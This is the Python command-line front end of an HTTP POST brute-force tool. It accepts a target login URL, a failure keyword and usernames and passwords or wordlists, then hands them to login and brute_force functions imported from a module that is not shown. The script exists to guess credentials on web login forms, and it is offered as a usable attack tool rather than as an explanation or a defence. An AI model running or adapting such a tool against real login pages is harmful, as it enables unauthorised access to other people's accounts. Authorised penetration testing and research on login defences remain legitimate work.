from brute import login, brute_force
import sys
import argparse

def main ():
    parser = argparse.ArgumentParser(description='HTTP POST Brute Force Script')
    parser.add_argument("-u", "--username", required=False, help="Username to brute force")
    parser.add_argument("-U", "--username_list", required=False, help="Username list to brute force")
    parser.add_argument("-p", "--password", required=False, help="Password to brute force")
    parser.add_argument("-P", "--passwords_list", required=False, help="Password list to brute force")
    parser.add_argument("-t", "--target", required=True, help="Target URL for the POST request (e.g. http://x.x.x.x/login.php)")
    parser.add_argument("-f", "--fail", required=True, help="Failure keyword (e.g. 'Invalid username or password')")

    args = parser.parse_args()
    
    if not (args.username or args.username_list):
        sys.exit("You must specify a username or a username list.")
    
    if not (args.password or args.passwords_list):
        sys.exit("You must specify a password or a password list.")
    
    if args.username and args.password:
        login(args.username, args.password, args.target, args.fail)
    else:
        usernames = [args.username] if args.username else open(args.username_list).read().splitlines()
        passwords = [args.password] if args.password else open(args.passwords_list).read().splitlines()
        brute_force(usernames, passwords, args.target, args.fail)
        
if __name__ == "__main__":
    main()
